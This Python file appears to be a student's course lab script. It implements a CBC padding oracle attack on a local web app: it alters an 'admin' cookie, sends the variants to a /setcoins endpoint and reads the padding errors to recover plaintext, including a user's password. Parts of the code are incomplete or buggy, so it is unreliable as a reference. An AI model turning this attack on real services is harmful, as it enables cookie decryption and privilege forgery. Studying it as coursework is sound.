import os
from cryptography.hazmat.primitives import hashes, padding, ciphers
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import algorithms

from requests import codes, Session
import requests

import app.api.encr_decr

import base64
import binascii
import random

LOGIN_FORM_URL = "http://localhost:8080/login"
SETCOINS_FORM_URL = "http://localhost:8080/setcoins"

# Functions for logging in from maul
from maul import do_login_form, do_setcoins_form


# You should implement this padding oracle object
# to craft the requests containing the mauled
# ciphertexts to the right URL.
class PaddingOracle(object):

    def __init__(self, po_url): 
        self.url = po_url
        self._block_size_bytes = ciphers.algorithms.AES.block_size/8
        print("Block size bytes: {}".format(self._block_size_bytes))

    @property
    def block_length(self): return self._block_size_bytes

    # you'll need to send the provided ciphertext
    # as the admin cookie, retrieve the request,
    # and see whether there was a padding error or not.
    def test_ciphertext(self, ct):
        pass

def split_into_blocks(msg, l):
    while msg:
        yield msg[:l]
        msg = msg[l:]
    
def po_attack_2blocks(po, ctx):
    """Given two blocks of cipher texts, it can recover the first block of
    the message.
    @po: an instance of padding oracle. 
    @ctx: a ciphertext 
    """
    assert len(ctx) == 2*po.block_length, "This function only accepts 2 block "\
        "cipher texts. Got {} block(s)!".format(len(ctx)/po.block_length)
    c0, c1 = list(split_into_blocks(ctx, int(po.block_length)))
    rand_bytes = bytearray(16)
    for i in range(len(rand_bytes)):
        rand_bytes[i] = round(random.random() * 255)
    # c0 = bytearray(16) + c0
    # c0 = rand_bytes + c0
    # c0 = c0 + rand_bytes
    print("C0 (len {}): {}".format(len(c0), c0))
    print("C1 (len {}): {}".format(len(c1), c1))

    # Implement padding oracle attack for 2 blocks of messages.

    plaintext = bytearray(16)
    # plaintext[0] = 255 # TODO: Don't init the admin byte to be 00, which looks valid to us
    count = 0
    for i in range(15, 0, -1):
        print("Checking i: {}".format(i))
        test = bytearray(16)
        for j in range(i + 1, 16):
            test[j] = plaintext[j] ^ c0[j] ^ (16 - i) # TODO: Are we sure this is right?
        # print("test with padding: {}".format(test))
        for val in range(256):
            test[i] = val
            # print("test with byte: {}".format(test))
            C1_prime = test + c1
            # print("C1 Prime: {}".format(C1_prime))
            if check_padding_response(C1_prime):
                count += 1
                print("Padding passed: {}".format((i,val)))
                plaintext[i] = val ^ c0[i] ^ (16 - i)
                break # Keep me # TODO: See if we're getting multiple passes per index? -> Piazza post with Philippe?

    # TODO: Need to recover last byte
    test = bytearray(32)
    for j in range(1, 16):
        test[j+16] = plaintext[j] ^ c0[j] ^ (16)
        for val in range(256):
            test[16] = val
            # print("test with byte: {}".format(test))
            C1_prime = test + c1
            # print("C1 Prime: {}".format(C1_prime))
            if check_padding_response(C1_prime):
                count += 1
                print("Padding passed: {}".format((0,val)))
                plaintext[0] = val ^ c0[0] ^ (16)
                break # Keep me # TODO: See if we're getting multiple passes per index? -> Piazza post with Philippe?

    if count < 16:
        print("Didn't recover full block. Recovered {} bytes only".format(count))
    return plaintext

def po_attack(po, ctx):
    """
    Padding oracle attack that can decrpyt any arbitrary length messags.
    @po: an instance of padding oracle. 
    You don't have to unpad the message.
    """
    ctx_blocks = list(split_into_blocks(ctx, int(po.block_length)))
    nblocks = len(ctx_blocks)
    print("Number of ciphertext blocks: {}".format(nblocks))
    # TODO: Implement padding oracle attack for arbitrary length message.
  
    # plaintext = bytearray(int(po.block_length) * nblocks)
    plaintext = bytearray()
    for i in range(nblocks - 1):
         print("Checking blocks C{} and C{}".format(i, i+1))
         plain = po_attack_2blocks(po, ctx_blocks[i] + ctx_blocks[i+1])
         print("Plain: {}".format(plain))
         # plaintext = plain + plaintext
         plaintext += plain
         print("Concat plaintext: {}".format(plaintext))
         
def is_response_ok(response):
    """
    Given a requests.Response object, does the 'error' div exist?
    """
    # print(response.text)
    error = int(response.text.find('Bad padding for admin cookie'))
    if error != -1:
        # print("Error Div found at index: {}".format(error))
        return False
    return True

def check_padding_response(cookie):
    """
    Given a cookie, make request to /setcoins with that cookie as admin cookie
    """
    sess.cookies.set("admin", None)
    sess.cookies.set("admin", cookie.hex())
    # print("Len of cookie: {}".format(len(cookie)))
    # print("Cookies after maul: {}".format(sess.cookies.get_dict()))
    result, response = do_setcoins_form(sess, uname, 5000)

    return is_response_ok(response)

if __name__ == "__main__":
    print("Running Padding Oracle Attack")
    
    sess = Session()
    print("Cookie pre logon: {}".format(sess.cookies.get_dict()))
    uname ="victim"
    pw = "victim"
    # uname = "andrew"
    # pw = "hellomynameisandrewpalmeriliketosurf"
    uname = 'test'
    pw = 'thisisalongpasswordtotest'
    assert(do_login_form(sess, uname,pw))
    print("Cookies after logon: {}".format(sess.cookies.get_dict()))
    admin_cookie = sess.cookies.get_dict()["admin"]
    print("Admin cookie: {}".format(admin_cookie))
    admin_cookie_bytes = bytearray.fromhex(admin_cookie)
    print("Admin cookie bytes: {}".format(admin_cookie_bytes))

    # First byte (C0 == IV)
    C0 = admin_cookie_bytes[0]
    print("CO: {}".format(C0))

    # Check padding response success
    # success = check_padding_response(bytes(16))
    # print("Success? {}".format(success))

    TEST_COOKIE = bytearray.fromhex("e9fae094f9c779893e11833691b6a0cd3a161457fa8090a7a789054547195e606035577aaa2c57ddc937af6fa82c013d")
    print("Test cookie (len {}): {}".format(len(TEST_COOKIE), TEST_COOKIE))

    print("test cookie first 32 bytes: {}".format(TEST_COOKIE[:32]))
    first_two_blocks = TEST_COOKIE[:32]

    # Instantitate padding oracle
    po = PaddingOracle(SETCOINS_FORM_URL)
    result = po_attack_2blocks(po, first_two_blocks)
    print("PO Attack 2 blocks result: {}".format(result))

    # Test with full test cookie
    # full_result = po_attack(po, TEST_COOKIE)

    # TODO: Capture user's password from admin cookie
    password = po_attack(po, admin_cookie_bytes)

    # TODO: Manually decrypt password to test po attack
    # encryption_key = b'\x00'*16
    # cbc = app.api.encr_decr.Encryption(encryption_key)
    # dpt = cbc.decrypt(bytes.fromhex(admin_cookie))
    # print("Decrypted admin cookie: {}".format(dpt))

